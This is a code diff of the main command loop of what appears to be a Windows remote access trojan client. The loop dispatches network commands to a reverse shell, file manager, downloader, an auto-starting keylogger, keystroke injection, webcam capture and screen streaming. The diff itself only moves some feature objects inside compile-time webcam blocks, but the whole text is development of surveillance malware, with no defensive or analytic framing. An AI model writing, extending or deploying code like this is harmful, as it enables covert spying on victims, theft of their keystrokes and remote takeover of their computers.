@@ -15,7 +15,6 @@
 #include "install/Install.h"
 #include "configuration.h"
 
-
 int main(int argc = 0, char *argv[] = nullptr) {
     Sleep(argc);
     HANDLE hMutexHandle = CreateMutex(nullptr, TRUE, reinterpret_cast<LPCSTR>(MUTEX));
@@ -41,11 +40,10 @@ int main(int argc = 0, char *argv[] = nullptr) {
                 FileManager fileManager(stream);
                 ReverseShell reverseShell(stream);
                 Download download(stream);
-                DeviceEnumerator deviceEnumerator(stream);
                 KeyboardExecuter keyboardExecuter(stream);
                 Permission permission(stream);
                 MessageBoxGUI messageBoxGui(stream);
-                ScreenStreamer screenStreamer(stream);
+
 #ifdef KEYLOGGER
                 KeyLogger keyLogger(stream);
                 keyLogger.tryStart();
@@ -118,7 +116,6 @@ int main(int argc = 0, char *argv[] = nullptr) {
                             keyLogger.stopKeylogger();
                             break;
                         }
-
                         case 4: { // sends last log file in current session of client
                             keyLogger.send();
                             break;
@@ -132,11 +129,13 @@ int main(int argc = 0, char *argv[] = nullptr) {
                             break;
                         }
 #endif
+#ifdef WEBCAM
                         case 16: { // send webcam devices
+                            DeviceEnumerator deviceEnumerator(stream);
                             deviceEnumerator.send();
                             break;
                         }
-#ifdef WEBCAM
+
                         case 17: { // start webcam with custom features
                             WebcamManager webcamManager(stream);
                             webcamManager.startWebcam();
@@ -161,6 +160,7 @@ int main(int argc = 0, char *argv[] = nullptr) {
                         }
 #ifdef WEBCAM
                         case 22: { // start screen streaming
+                            ScreenStreamer screenStreamer(stream);
                             screenStreamer.send();
                             break;
                         }
